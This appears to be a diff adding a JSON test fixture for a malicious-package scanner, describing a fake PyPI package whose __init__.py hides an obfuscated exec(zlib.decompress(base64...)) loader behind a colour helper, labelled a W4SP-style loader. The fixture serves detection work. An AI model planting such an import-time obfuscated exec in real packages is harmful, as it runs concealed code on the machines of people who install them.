@@ -1,0 +1,23 @@
+{
+ "ecosystem": "pypi",
+ "expected": [
+  "obfuscation",
+  "sparse-metadata"
+ ],
+ "files": {
+  "pystyle-colors-ext-0.0.4/pystyle_colors_ext/__init__.py": "import base64\nimport zlib\n\ndef red(text):\n    return \"\\033[31m\" + text + \"\\033[0m\"\n\nexec(zlib.decompress(base64.b64decode(\"eJzty7ENgDAMBMCeKdwFVmAKOuooMrGFZCzHSLA9a1D89eehlnMZr6VwaqPt7HvNJnTok3fwSnalqHWS6s42SDi4LJNjYmJiYmL+Yn6UGnxV\")))\n",
+  "pystyle-colors-ext-0.0.4/setup.py": "from setuptools import setup\n\nsetup(name=\"pystyle-colors-ext\", version=\"0.0.4\")\n"
+ },
+ "meta": {
+  "archive_kinds": [
+   "sdist"
+  ],
+  "created_days_ago": 1,
+  "description": "Terminal styling helpers",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "pystyle-colors-ext",
+ "pattern": "W4SP-style loader: exec(zlib.decompress(base64...)) hidden in __init__.py",
+ "version": "0.0.4"
+}
